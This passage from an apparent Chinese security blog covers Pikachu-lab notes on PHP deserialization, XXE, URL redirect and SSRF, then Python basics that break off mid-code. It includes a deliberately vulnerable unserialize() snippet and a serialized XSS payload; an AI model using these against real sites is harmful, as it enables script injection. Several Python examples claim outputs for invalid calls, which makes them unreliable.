title="概述"></a>概述</h2><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;<br>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。         </p><h2 id="IcanseeyourABC"><a href="#IcanseeyourABC" class="headerlink" title="IcanseeyourABC"></a>IcanseeyourABC</h2><h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h2 id="概述-11"><a href="#概述-11" class="headerlink" title="概述"></a>概述</h2><p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</p><h3 id="序列化serialize"><a href="#序列化serialize" class="headerlink" title="序列化serialize()"></a>序列化serialize()</h3><p>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:            </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>(); <span class="comment">//创建一个对象</span></span><br><span class="line">   <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>); <span class="comment">//把这个对象进行序列化</span></span><br><span class="line">   序列化后得到的结果是这个样子的:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line">       O:代表<span class="keyword">object</span></span><br><span class="line">       <span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">       S:对象的名称</span><br><span class="line">       <span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">       s:数据类型</span><br><span class="line">       <span class="number">4</span>:变量名称的长度</span><br><span class="line">       test:变量名称</span><br><span class="line">       s:数据类型</span><br><span class="line">       <span class="number">7</span>:变量值的长度</span><br><span class="line">       pikachu:变量值</span><br></pre></td></tr></table></figure><h3 id="反序列化unserialize"><a href="#反序列化unserialize" class="headerlink" title="反序列化unserialize()"></a>反序列化unserialize()</h3><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$u</span>=<span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;O:1:&quot;</span>S<span class="string">&quot;:1:&#123;s:4:&quot;</span>test<span class="string">&quot;;s:7:&quot;</span>pikachu<span class="string">&quot;;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$u</span>-&gt;test; <span class="comment">//得到的结果为pikachu</span></span><br></pre></td></tr></table></figure><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">        <span class="title function_ invoke__">__construct</span>()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">__destruct</span>()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">__toString</span>()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">__sleep</span>() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">        __wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">        漏洞举例:</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line">        @<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">        payload:O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">29</span>:<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><h2 id="php反序列化漏洞"><a href="#php反序列化漏洞" class="headerlink" title="php反序列化漏洞"></a>php反序列化漏洞</h2><h1 id="XXE-XML-External-Entity-attack"><a href="#XXE-XML-External-Entity-attack" class="headerlink" title="XXE(XML External Entity attack)"></a>XXE(XML External Entity attack)</h1><h2 id="概述-12"><a href="#概述-12" class="headerlink" title="概述"></a>概述</h2><p>XXE -“xml external entity injection”<br>既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。<br>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。<br>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。  </p><h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><h1 id="不安全的URL重定向"><a href="#不安全的URL重定向" class="headerlink" title="不安全的URL重定向"></a>不安全的URL重定向</h1><h2 id="概述-13"><a href="#概述-13" class="headerlink" title="概述"></a>概述</h2><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生”跳错对象”的问题。<br>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p><h2 id="不安全的URL跳转"><a href="#不安全的URL跳转" class="headerlink" title="不安全的URL跳转"></a>不安全的URL跳转</h2><h1 id="SSRF-Server-Side-Request-Forgery：服务器端请求伪造"><a href="#SSRF-Server-Side-Request-Forgery：服务器端请求伪造" class="headerlink" title="SSRF(Server-Side Request Forgery：服务器端请求伪造)"></a>SSRF(Server-Side Request Forgery：服务器端请求伪造)</h1><h2 id="概述-14"><a href="#概述-14" class="headerlink" title="概述"></a>概述</h2><p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制<br>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据<br>数据流:攻击者—–&gt;服务器—-&gt;目标地址<br>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p>]]></content>
      
      
      <categories>
          
          <category> hack技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python基础学习笔记</title>
      <link href="/posts/1327/"/>
      <url>/posts/1327/</url>
      
        <content type="html"><![CDATA[<h1 id="Python3学习笔记"><a href="#Python3学习笔记" class="headerlink" title="Python3学习笔记"></a>Python3学习笔记</h1><blockquote><p><strong>写在前面</strong></p><p><strong>最近打CTF已经遇到瓶颈了，简单的、考点比较单一的题能打，但是比赛现在的web题都是综合性比较好的，自己写脚本的水平也是不太行，所以准备打一下Python的基础，之后开始复现那些高水平的web题</strong></p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>解释型语言：开发过程没有编译环节，类似的有PHP、Perl</li><li>交互式语言：在命令行、终端中，可以在一个Python提示符<code>&gt;&gt;&gt;</code>后直接执行代码</li><li>面向对象语言：Python支持面向对象的风格或代码封装在对象的编程技术</li></ul><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><blockquote><p>选择的集成开发环境：<strong>PyCharm</strong></p></blockquote><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><ul><li>第一个字符必须是字母表中的字母或者下划线<code>_</code></li><li>其他部分可以是字母、数字、下划线、中文</li><li>标识符对大小写敏感</li></ul><h3 id="保留字"><a href="#保留字" class="headerlink" title="保留字"></a>保留字</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标准库里面有一个keyword模块，可以查看当前版本所有关键字</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> keyword</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>keyword.kwlist</span><br><span class="line">[<span class="string">&#x27;False&#x27;</span>, <span class="string">&#x27;None&#x27;</span>, <span class="string">&#x27;True&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;as&#x27;</span>, <span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;async&#x27;</span>, <span class="string">&#x27;await&#x27;</span>, <span class="string">&#x27;break&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;continue&#x27;</span>, <span class="string">&#x27;def&#x27;</span>, <span class="string">&#x27;del&#x27;</span>, <span class="string">&#x27;elif&#x27;</span>, <span class="string">&#x27;else&#x27;</span>, <span class="string">&#x27;except&#x27;</span>, <span class="string">&#x27;finally&#x27;</span>, <span class="string">&#x27;for&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;in&#x27;</span>, <span class="string">&#x27;is&#x27;</span>, <span class="string">&#x27;lambda&#x27;</span>, <span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br><span class="line"><span class="comment"># Python3.7</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python中单行注释以#开头</span></span><br><span class="line"><span class="comment"># 第一个注释</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;Hello, Python!&quot;</span>) <span class="comment"># 第二个注释</span></span><br></pre></td></tr></table></figure><h3 id="行与缩进"><a href="#行与缩进" class="headerlink" title="行与缩进"></a>行与缩进</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python以缩进来表示代码块，不用&#123;&#125;,同一个代码块的语句必须包含相同的缩进空格数</span></span><br><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;False&quot;</span>)</span><br><span class="line"><span class="comment"># Python一般是一行写完一条语句，可以用反斜杠\来实现多行语句</span></span><br><span class="line">total = item_one + \</span><br><span class="line">item_two + \</span><br><span class="line">    item_three</span><br><span class="line"><span class="comment"># 在[]、&#123;&#125;、()的多行语句中，不用反斜杠\</span></span><br><span class="line">total = [<span class="string">&#x27;item_one&#x27;</span>, <span class="string">&#x27;item_two&#x27;</span>, <span class="string">&#x27;item_three&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;item_four&#x27;</span>, <span class="string">&#x27;item_five&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><p>有整数、布尔、浮点数和复数</p><ul><li><code>int</code>：如1，<strong>只有长整型</strong></li><li><code>bool</code>：True或者False</li><li><code>float</code>：1.23、3E-2</li><li><code>complex</code>：1+2j、1.1+2.2j</li></ul><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><ul><li><p>单引号和双引号一样</p></li><li><p>转义字符<code>\</code></p></li><li><p>字符串可以用<code>+</code>连接，用<code>*</code>重复</p></li><li><p>Python中的字符串不能改变，且没有单独的字符说法，一个字符就是一个长度为 1 的字符串</p></li><li><p>字符串截取语法：&#x3D;&#x3D;变量[头下标:尾下标:步长]&#x3D;&#x3D;</p></li><li><p>Python的字符串是左包含的，从左往右以 0 开始，从右往左以 -1 开始</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;C1everF0x&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 结果是 C1everF0x</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">5</span>])</span><br><span class="line"><span class="comment"># 结果是 eve</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="comment"># 结果是 C1everF0</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><ul><li>函数之间、类的方法之间用空行分隔，表示一段新的代码开始，方便以后代码的维护和重构</li></ul><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><ul><li><code>print</code>输出默认换行，不换行要在变量末尾加上 <code>end=“ ”</code></li></ul><h3 id="import和from…import"><a href="#import和from…import" class="headerlink" title="import和from…import"></a>import和from…import</h3><ul><li>用于导入相应模块</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> somemodule<span class="comment"># 导入整个模块，引用时格式为：somemodudle.somefunction()</span></span><br><span class="line"><span class="keyword">from</span> somemodule <span class="keyword">import</span> somefunction<span class="comment"># 从某个模块中导入一些函数，引用时格式为：somefunction()</span></span><br><span class="line"><span class="keyword">from</span> somemodule <span class="keyword">import</span> *<span class="comment"># 导入某个模块全部函数，引用时格式为：somefunction()</span></span><br><span class="line"><span class="keyword">import</span> somemodule <span class="keyword">as</span> abc<span class="comment"># 作用是自定义模块名字，在引用时格式为：abc.somefunction()</span></span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><blockquote><p><strong>其实这六个数据类型，其实都是Python定义的内建类，每一个变量（对象）其实就是类的实例化</strong></p><p><strong>即，所有的字符串都是<code>str</code>类的实例，所有的列表都是<code>list</code>类的实例</strong></p></blockquote><table><thead><tr><th>不可变</th><th>可变</th></tr></thead><tbody><tr><td>Number</td><td>List</td></tr><tr><td>String</td><td>Dictionary</td></tr><tr><td>Tuple（元组）</td><td>Set（集合）</td></tr></tbody></table><h4 id="Number"><a href="#Number" class="headerlink" title="Number"></a>Number</h4><ul><li><p><code>int</code> <code>float</code> <code>bool</code> <code>complex</code> 四种类型，其中<code>int</code>只有长整型</p></li><li><p>加减乘除正常用，<code>/</code>返回浮点数，<code>//</code>返回整数</p></li><li><p>数字类型值不可变的原因就是，只要两个变量的值相同，那么他们的&#x3D;&#x3D;ID(地址)&#x3D;&#x3D;就是相同的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">5</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">5</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(a)  </span><br><span class="line"><span class="number">162334512</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(b)  </span><br><span class="line"><span class="number">162334512</span>  </span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a <span class="keyword">is</span> b  </span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="String（上面字符串）"><a href="#String（上面字符串）" class="headerlink" title="String（上面字符串）"></a>String（上面字符串）</h4><h4 id="Tuple（元组）"><a href="#Tuple（元组）" class="headerlink" title="Tuple（元组）"></a>Tuple（元组）</h4><ul><li><p>用<code>()</code>表示，比如<code>(&#39;abcd&#39;, 786, 2.23, &#39;C1everF0x&#39;, 70.2)</code>就是一个元组</p></li><li><p>截取、索引和切片方法和字符串一样</p></li><li><p>构造包含 0 个或 1 个元素的元组语法规则比较特殊</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tup1 = ()<span class="comment"># 空元组</span></span><br><span class="line">tup2 = (<span class="number">20</span>,)<span class="comment"># 含一个元素的，需要在元素后面添加逗号</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="List（列表）"><a href="#List（列表）" class="headerlink" title="List（列表）"></a>List（列表）</h4><ul><li>用<code>[]</code>表示，比如<code>[ &#39;abcd&#39;, 786 , 2.23, &#39;C1everF0x&#39;, 70.2 ]</code>就是一个列表</li><li>截取、索引和切片方法和字符串一样</li></ul><h4 id="Set（集合）"><a href="#Set（集合）" class="headerlink" title="Set（集合）"></a>Set（集合）</h4><ul><li>用<code>&#123;&#125;</code>或者<code>set()</code>创建集合，空集必须用<code>set()</code>，因为<code>&#123;&#125;</code>是用来创建空字典</li></ul><h4 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h4><ul><li><p>字典包含在<code>&#123;&#125;</code>中，每个键值<code>key=&gt;value</code> 对用冒号<code>:</code> 分割，每个对之间用逗号分割</p></li><li><p>键必须是唯一的，值不是唯一的</p></li><li><p>键的数据类型只能是字符串或数字，值可以是任何数据类型</p></li></ul><h3 id="基础语法-1"><a href="#基础语法-1" class="headerlink" title="基础语法"></a>基础语法</h3><ul><li>跟C语言差不多，不记上来了</li></ul><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul><li><p>自定义函数以<code>def</code>开头，接函数名，接<code>(参数列表)</code>，接<code>:</code></p></li><li><p><code>return [表达式]</code>表示结束函数，返回一个东西，如果没有则是返回<code>None</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">函数名</span> (参数列表):</span><br><span class="line">函数代码</span><br></pre></td></tr></table></figure></li></ul><blockquote><p>学到这里的时候发现有一个概念</p><p>Python里面变量是没有类型的，类型是属于对象，其中就有<strong>可更改对象</strong>和<strong>不可更改对象</strong></p><ul><li>不可变对象：数字、字符串、元组</li><li>可变对象：列表、集合、字典</li></ul><p><strong>本质区别</strong></p><p>当给不可变对象重新传值的时候，不是修改了变量的值，而是重新生成了一个新的对象，然后再让变量指向新的内存地址，&#x3D;&#x3D;其内存地址发生了改变&#x3D;&#x3D;</p><p>当给可变对象重新传值的时候，是真正修改了对象的值，没有重新生成一个新的对象，变量前后指向的是同一个内存地址，&#x3D;&#x3D;其内存地址没有发生改变&#x3D;&#x3D;</p></blockquote><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><h5 id="必须参数"><a href="#必须参数" class="headerlink" title="必须参数"></a>必须参数</h5><ul><li>顺序要对，调用数量要对，数据类型也要对</li></ul><h5 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h5><ul><li><p>在调用时，允许参数顺序和函数声明的时候不一样，解释器能够自动匹配</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> name, age </span>):</span><br><span class="line"><span class="comment"># 打印任何传入的字符串</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printsomething函数</span></span><br><span class="line">printsomething( age=<span class="number">19</span>, name=<span class="string">&quot;C1everF0x&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="comment"># 名字:  C1everF0x</span></span><br><span class="line"><span class="comment"># 年龄:  19</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h5><ul><li><p>使用函数传参的时候没有传具体值进去，就会使用默认值，即函数声明时参数列表里面已经设置好的那个值</p></li><li><p>默认参数必须放在最后，不然报错</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> age, <span class="built_in">id</span> = C1everF0x </span>):</span><br><span class="line"><span class="comment"># 打印函数，年龄和id</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;年龄：&quot;</span>, age)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;id：&quot;</span>, <span class="built_in">id</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用printsomething函数</span></span><br><span class="line">printsomething( age=<span class="number">19</span>, <span class="built_in">id</span>=<span class="string">&quot;Oui0jr&quot;</span>)</span><br><span class="line"><span class="comment"># 结果是：</span></span><br><span class="line"><span class="comment"># 年龄：19</span></span><br><span class="line"><span class="comment"># id：Oui0jr</span></span><br><span class="line">printsomething( age=<span class="number">19</span>, <span class="built_in">id</span>)</span><br><span class="line"><span class="comment"># 结果是：</span></span><br><span class="line"><span class="comment"># 年龄：19</span></span><br><span class="line"><span class="comment"># id：C1everF0x</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="不定长参数"><a href="#不定长参数" class="headerlink" title="不定长参数"></a>不定长参数</h5><ul><li><p>当你不知道你要传多少、传什么类型的参数进去的时候可以采用，以存放所有未命名的参数</p></li><li><p>加了星号<code>*</code>的参数是以元组形式导入</p><p>语法为：def 函数名([常规参数], *vartuple):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> <span class="built_in">id</span>=C1everF0x, *vartuple </span>):</span><br><span class="line"><span class="comment"># 打印函数，id、年龄和水平</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;输出：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">id</span>)</span><br><span class="line"><span class="built_in">print</span> (vartuple)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用printsomething函数</span></span><br><span class="line">printsomething( <span class="built_in">id</span>, <span class="number">19</span>, <span class="string">&quot;弟弟&quot;</span>)</span><br><span class="line"><span class="comment"># 结果是</span></span><br><span class="line"><span class="comment"># 输出：</span></span><br><span class="line"><span class="comment"># C1everF0x</span></span><br><span class="line"><span class="comment"># (19,&quot;弟弟&quot;)</span></span><br></pre></td></tr></table></figure></li><li><p>加了两个星号<code>**</code>的参数是以字典形式导入</p><p>语法为：def 函数名([常规参数], **vartuple):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">printsomething</span>(<span class="params"> <span class="built_in">id</span>, **vardict </span>):</span><br><span class="line"><span class="comment"># 打印任何传入的参数</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (<span class="built_in">id</span>)</span><br><span class="line">   <span class="built_in">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printsomething函数</span></span><br><span class="line">printinfo(C1everF0x, age=<span class="number">19</span>,lever=<span class="string">&quot;弟弟&quot;</span>)</span><br><span class="line"><span class="comment"># 结果是：</span></span><br><span class="line"><span class="comment"># 输出: </span></span><br><span class="line"><span class="comment"># C1everF0x</span></span><br><span class="line"><span class="comment"># &#123;&#x27;age&#x27;: 19, &#x27;level&#x27;: &quot;弟弟&quot;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>单独一个星号<code>*</code>不带参数，调用时必须传&#x3D;&#x3D;关键字&#x3D;&#x3D;进去</p><p>语法为：def 函数名([常规参数], *):</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">a,b,*,c</span>):</span><br><span class="line"><span class="keyword">return</span> a+b+c</span><br><span class="line">f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line">f(<span class="number">1</span>,<span 